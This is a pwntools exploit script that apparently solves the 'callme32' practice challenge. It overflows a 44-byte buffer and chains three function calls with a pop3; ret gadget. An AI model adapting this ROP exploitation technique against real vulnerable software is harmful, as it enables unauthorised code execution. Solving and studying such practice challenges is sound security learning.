#!/usr/bin/env python
from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

local = 1
if local:
	p = process('./callme32')
else:
	p = remote()

func_three = 0x080485B0 # 0804881B
func_two = 0x08048620 # 0x0804882C
func_one = 0x080485C0 # 0x0804883D

pop3_ret = 0x080488a9

gdb.attach(p, 'b 0x8048801')

payload = cyclic(0x100)
payload = 'A' * 44
call_one = p32(func_one) + p32(pop3_ret) + \
	p32(1) + p32(2) + p32(3)
call_two = p32(func_two) + p32(pop3_ret) + \
	p32(1) + p32(2) + p32(3)
call_three = p32(func_three) + p32(pop3_ret) + \
	p32(1) + p32(2) + p32(3)
payload += call_one + call_two + call_three
p.recvuntil('> ')
p.sendline(payload)

p.interactive()
